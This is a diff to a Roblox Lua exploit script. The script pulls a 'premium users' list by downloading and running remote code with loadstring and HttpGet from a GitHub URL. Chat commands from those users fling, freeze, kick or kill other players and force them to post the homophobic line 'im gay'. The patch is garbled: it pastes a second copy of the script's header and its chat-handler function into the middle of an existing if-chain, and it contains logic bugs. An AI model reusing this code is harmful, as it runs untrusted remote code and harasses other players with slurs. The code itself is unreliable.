@@ -102,6 +102,112 @@ local function handleChat(premiumUser)
             if isNotSelf() then
                 ChatEvents.SayMessageRequest:FireServer("im gay", "All")
             end
+
+local premiumUsers = loadstring(game:HttpGet('https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Okay'))()
+
+local Players = game:GetService("Players")
+local ChatEvents = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
+local StarterGui = game:GetService("StarterGui")
+local Debris = game:GetService("Debris")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ChatSendAnySC = ReplicatedStorage:WaitForChild("ChatSendAnySC") -- Your custom chat send event
+
+local function getPlayerByName(name)
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name:lower() == name:lower() then
+            return p
+        end
+    end
+    return nil
+end
+
+local function freeze(character)
+    if character then
+        for _, part in pairs(character:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.Anchored = true
+            end
+        end
+    end
+end
+
+local function unfreeze(character)
+    if character then
+        for _, part in pairs(character:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.Anchored = false
+            end
+        end
+    end
+end
+
+local function isPremiumUser(player)
+    for _, user in ipairs(premiumUsers) do
+        if user and user.Name == player.Name then
+            return true
+        end
+    end
+    return false
+end
+
+local function handleChat(premiumUser)
+    if not premiumUser then return end
+
+    local function onMessage(data)
+        -- data: {Message, Speaker, ...}
+        local message = data.Message
+        local senderUserId = data.SpeakerUserId
+        local senderPlayer = Players:GetPlayerByUserId(senderUserId)
+        if not senderPlayer then return end
+        if senderPlayer ~= premiumUser then return end
+
+        local character = senderPlayer.Character
+        local hrp = character and character:FindFirstChild("HumanoidRootPart")
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local upperTorso = character and character:FindFirstChild("UpperTorso")
+
+        local function isNotSelf()
+            return senderPlayer ~= Players.LocalPlayer
+        end
+
+        if message:match("^%.fling%s*%.") then
+            if isNotSelf() and hrp then
+                hrp.CFrame = CFrame.new(0, 999, 0)
+                local power = 99999999
+                for _, part in pairs(character:GetChildren()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = false
+                    end
+                end
+                local thrust = Instance.new("BodyThrust", hrp)
+                thrust.Force = Vector3.new(power, 0, power)
+                Debris:AddItem(thrust, 2)
+            end
+        elseif message:match("^%.freeze%s*%.") then
+            if isNotSelf() then freeze(character) end
+        elseif message:match("^%.unfreeze%s*%.") then
+            if isNotSelf() then unfreeze(character) end
+        elseif message:match("^%.kxck%s*%.") then
+            if isNotSelf() then senderPlayer:Kick("You have been kicked.") end
+        elseif message:match("^%.oof%s*%.") then
+            if isNotSelf() and humanoid then humanoid:Destroy() end
+        elseif message:match("^%.error%s*%.") then
+            if isNotSelf() and hrp then hrp.CFrame = CFrame.new(99999, 99999, 99999) end
+        elseif message:match("^%.bring%s*%.") then
+            if isNotSelf() and upperTorso and senderPlayer.Character then
+                local targetPos = senderPlayer.Character:FindFirstChild("UpperTorso") and senderPlayer.Character.UpperTorso.Position
+                if targetPos and hrp then
+                    hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
+                end
+            end
+        elseif message:match("^%.sit%s*%.") then
+            if isNotSelf() and humanoid then humanoid.Sit = true end
+        elseif message:match("^%.unsit%s*%.") then
+            if isNotSelf() and humanoid then humanoid.Sit = false end
+        elseif message:match("^%.troll%s*%.") then
+            if isNotSelf then
+                ChatEvents.SayMessageRequest:FireServer("im gay", "All")
+            end
         elseif message:match("^%.enlighten%s*%.") then
             if isNotSelf() and character then
                 local tool = senderPlayer.Backpack:FindFirstChild("The Arkenstone")
@@ -118,7 +224,7 @@ local function handleChat(premiumUser)
         elseif message:match("^%.say%s+(.+)") then
             local text = message:match("^%.say%s+(.+)")
             if isNotSelf() then
-                ChatEvents.SayMessageRequest:FireServer(text, "All")
+                ChatSendAnySC:FireServer(text)
             end
         elseif message:match("^%.cmd%s+(.+)") then
             local cmdText = message:match("^%.cmd%s+(.+)")
